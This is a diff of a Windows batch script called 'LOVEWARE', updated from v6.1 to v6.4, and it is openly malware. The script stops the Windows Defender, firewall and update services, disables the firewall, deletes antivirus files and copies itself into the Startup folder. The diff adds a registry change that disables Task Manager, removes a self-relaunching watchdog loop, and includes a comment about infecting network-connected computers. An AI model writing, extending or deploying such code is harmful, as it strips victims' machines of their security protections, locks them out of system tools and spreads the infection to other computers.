@@ -1,6 +1,6 @@
 @echo off
 
-:: LOVEWARE v6.1
+:: LOVEWARE v6.4
 ::
 :: YOU CAN DELETE THIS 
 :: |  |  |  |  |  |  |
@@ -90,7 +90,7 @@ if %errorLevel% == 0 (
 
 :run
 
-:: Disable antivirus, firewall...
+:: Disable antivirus, firewall, taskmaneger...
 
 net stop "SDRSVC"
 net stop "WinDefend"
@@ -100,6 +100,8 @@ netsh firewall set opmode mode-disable
 net stop "wuauserv"
 net stop "Windows Defender Service"
 net stop "Windows Firewall"
+
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
 
 del /Q /F C:\Program Files\alwils~1\avast4\*.*
 del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
@@ -136,27 +138,6 @@ echo )>>LoveLetter.bat
 :copylove
 XCOPY "LoveLetter.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 goto copylove
-
-:: Create new file that will start LoveLetter.bat
-:: if Loveware is closed
-
-echo @echo off>Lovewatch.bat
-echo title Lovewatch>>Lovewatch.bat
-echo :Love>>Lovewatch.bat
-echo tasklist | find /I "Loveware">>Lovewatch.bat
-echo if errorlevel 1 (>>Lovewatch.bat
-echo         start LoveLetter.bat>>Lovewatch.bat
-echo goto Love>>Lovewatch.bat
-
-start /min Lovewatch.bat
-
-:: Start LoveLetter.bat if Lovewatch is closed
-
-:Loveyou
-tasklist | find /I "Lovewatch"
-if errorlevel 1 (
-         start LoveLetter.bat
-goto Loveyou
 
 :: Infect network connected computers
 
@@ -536,7 +517,7 @@ tasklist | find /I "LoveChoice"
 
 if errorlevel 1 (
 
-         start LoveLetter.bat
+         start %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\LoveLetter.bat
 
 goto LOVE
 
